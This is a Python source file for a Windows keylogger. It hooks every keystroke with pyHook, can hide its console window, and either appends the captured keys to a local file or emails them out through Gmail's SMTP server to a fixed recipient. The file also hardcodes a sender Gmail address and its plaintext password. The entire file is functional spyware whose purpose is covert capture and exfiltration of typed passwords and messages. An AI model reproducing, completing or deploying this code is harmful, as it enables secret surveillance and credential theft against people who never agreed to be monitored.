import pythoncom
import pyHook
import threading
import datetime,time
import win32event, win32api, winerror
import scrnshot
import win32console,win32gui
import threading
import time

import smtplib

from string import Template

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

MY_ADDRESS = 'bikso284@gmail.com'
PASSWORD = 'gamingisthebest'

def read_template():
    global data
    #with open(filename, 'r', encoding='utf-8') as template_file:
    template_file_content = data
    data = ''
    return Template(template_file_content)


mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')

x=''
data=''

#Hiding the GUI of the process
def hide_the_window():

    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

#Saving in the local file system
def local():
    global data
    fp=open("keylogs.txt","a")
    fp.write(data)
    fp.close()
    data=''
    return True

def mailing():
    time.sleep(10)
    names = ['Vaibhav']
    emails = ['kaps12271@gmail.com'] # read contacts
    message_template = read_template()

    # set up the SMTP server
    s = smtplib.SMTP(host="smtp.gmail.com", port=587)
    s.starttls()
    s.login(MY_ADDRESS, PASSWORD)

    # For each contact, send the email:
    for name, email in zip(names, emails):
        msg = MIMEMultipart()       # create a message

        # add in the actual person name to the message template
        message = message_template.substitute(PERSON_NAME=name.title())

        # Prints out the message body for our sake
        print(message)

        # setup the parameters of the message
        msg['From']=MY_ADDRESS
        msg['To']=email
        msg['Subject']="This is TEST"

        # add in the message body
        msg.attach(MIMEText(message, 'plain'))

        # send the message via the server set up earlier.
        s.send_message(msg)
        del msg

    # Terminate the SMTP session and close the connection
    s.quit()

#Main function
def main():
    global x
    x = 2
    #hide_the_window()
    #t.join()
    #scrnshot.take_screenshot(10)
    return True

if __name__ == '__main__':
    main()

    #threads = []
    #t1 = threading.Thread(target = main)
    #threads += [t1]
    #t1.start()
    """t1 = threading.Thread(target = keylog)
    threads += [t1]
    t1.start()
    t3 = threading.Thread(target = scrnshot.take_screenshot, args = (10,))
    threads += [t3]
    t3.start()

    for i in threads:
        i.join()"""


#Getting the ASCII values of the keys pressed
def keypressed(event):
    global x,data
    if(event.Ascii == 13):
        keys='<ENTER>'
    elif(event.Ascii == 8):
        keys='<BACK SPACE>'
    elif(event.Ascii == 9):
        keys = '<TAB>'
    else:
        keys = chr(event.Ascii)
    data = data + keys
    if x == 1:
        local()
    elif x == 2:
        mailing()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
